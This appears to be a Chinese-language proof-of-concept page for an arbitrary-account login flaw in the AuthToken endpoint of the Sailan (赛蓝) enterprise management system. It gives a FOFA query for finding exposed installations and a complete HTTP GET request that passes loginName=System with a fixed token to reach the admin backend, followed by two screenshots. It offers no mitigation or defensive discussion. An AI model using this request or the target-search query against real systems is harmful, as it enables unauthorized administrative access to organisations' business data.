# 赛蓝企业管理系统AuthToken接口存在任意账号登录漏洞

赛蓝企业管理系统AuthToken接口存在任意账号登录漏洞，该漏洞可直接登录后台。

## fofa

```java
body="www.cailsoft.com" || body="赛蓝企业管理系统"
```

## poc

```
GET /AuthToken/Index?loginName=System&token=c94ad0c0aee8b1f23b138484f014131f HTTP/1.1
Host: 
```

![image-20240801195959160](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408011959230.png)

![image-20240801200007710](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202408012000770.png)